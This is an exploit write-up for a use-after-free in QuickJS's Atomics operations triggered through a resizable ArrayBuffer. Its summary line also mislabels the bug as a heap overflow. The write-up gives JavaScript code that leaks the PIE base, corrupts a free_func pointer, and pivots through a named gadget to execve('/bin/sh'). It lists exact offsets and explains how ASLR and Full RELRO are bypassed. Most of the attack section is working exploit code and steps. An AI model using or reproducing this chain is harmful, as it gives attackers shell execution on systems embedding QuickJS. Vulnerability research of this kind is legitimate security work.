# QuickJS Atomics Use-After-Free to Shell Execution (Full RELRO)

## Vulnerability Summary

A heap buffer overflow vulnerability exists in QuickJS's `js_atomics_op()` function. The vulnerability is triggered by using a Resizable ArrayBuffer (RAB) with Atomics operations, where the buffer can be resized during the `valueOf()` callback of the operand.

## Root Cause

In `quickjs.c` at line 58725, the `js_atomics_op()` function:

1. Captures a pointer `ptr` to the ArrayBuffer's data via `js_atomics_get_ptr()`
2. Calls `JS_ToUint32()` or `JS_ToBigInt64()` to convert the value argument
3. This conversion triggers the `valueOf()` callback on a malicious object
4. In `valueOf()`, the ArrayBuffer is resized using `ab.resize(larger_size)`
5. The resize operation causes `realloc()` to move the buffer data to a new location
6. The original buffer data is freed, but `ptr` still points to the freed memory
7. The function checks only `abuf->detached`, not whether the buffer was moved
8. The stale `ptr` is then used for the atomic operation, causing a use-after-free

## Exploitation Strategy

### Step 1: PIE Leak

The vulnerability allows reading from freed memory. When a 56-byte buffer (matching JSArrayBuffer struct size) is freed and reallocated for a new ArrayBuffer's metadata structure, we can read the `free_func` pointer at offset 48:

```javascript
let ab1 = new ArrayBuffer(56, { maxByteLength: 1024 });
let view1 = new BigInt64Array(ab1);

let mal1 = {
    valueOf: function() {
        ab1.resize(1024);  // Frees 56-byte slot
        // New ArrayBuffer structs fill the freed slot
        for (let i = 0; i < 5; i++) blockers.push(new ArrayBuffer(128));
        return 0n;
    }
};

let free_func = Atomics.add(view1, 6, mal1);  // Read offset 48
let pie_base = free_func - 0x14bc0n;  // js_array_buffer_free offset
```

### Step 2: Corrupt free_func Pointer

Using the same technique, we corrupt the `free_func` pointer of a victim ArrayBuffer. The JSArrayBuffer struct layout is:

- Offset 0: byte_length (4 bytes)
- Offset 16: data pointer (8 bytes)
- Offset 40: opaque pointer (8 bytes) - NULL for regular ArrayBuffers
- Offset 48: free_func pointer (8 bytes)

### Step 3: Gadget Selection

With Full RELRO, the GOT is read-only, so we need a ROP-style gadget. The key gadget found at offset `0x36736`:

```asm
lea rdi, [rdx + 0x20]    ; rdi = data + 32
call qword ptr [rdx]      ; call function pointer at data[0]
```

At the `free_func` call site in `js_array_buffer_finalizer`:
- rdi = rt (JSRuntime pointer)
- rsi = abuf->opaque (NULL for normal ArrayBuffers)
- rdx = abuf->data (our controlled buffer)

### Step 4: Controlled Data Buffer

We create a victim ArrayBuffer with specific data content:

```javascript
let victim = new ArrayBuffer(64);
let v64 = new BigInt64Array(victim);
v64[0] = my_execvpe;  // data[0] = my_execvpe function address

let v8 = new Uint8Array(victim);
// data[0x20] = "/bin/sh\0"
v8[0x20] = 0x2F; v8[0x21] = 0x62; v8[0x22] = 0x69; v8[0x23] = 0x6E;
v8[0x24] = 0x2F; v8[0x25] = 0x73; v8[0x26] = 0x68; v8[0x27] = 0x00;
```

### Step 5: Execution Flow

1. Gadget executes with rdx pointing to our data buffer
2. `lea rdi, [rdx + 0x20]` sets rdi to pointer to "/bin/sh"
3. `call [rdx]` calls `my_execvpe` at offset 0xc8fb0
4. `my_execvpe("/bin/sh", NULL, data)` is called
5. Since "/bin/sh" contains '/', `my_execvpe` directly calls `execve("/bin/sh", NULL, data)`
6. Shell is spawned!

## Key Offsets (PIE-relative)

| Symbol | Offset |
|--------|--------|
| js_array_buffer_free | 0x14bc0 |
| my_execvpe.isra.0 | 0xc8fb0 |
| Gadget (lea rdi, [rdx+0x20]; call [rdx]) | 0x36736 |

## Mitigation Bypasses

- **ASLR**: Bypassed via PIE leak from free_func pointer
- **Full RELRO**: Bypassed by corrupting function pointer in heap structure instead of GOT
- **Stack Canaries**: Not relevant (no stack buffer overflow)

## Files

- **PoC**: `/tmp/work/exploit17.js`
- **Analysis**: `/tmp/work/analysis.md`
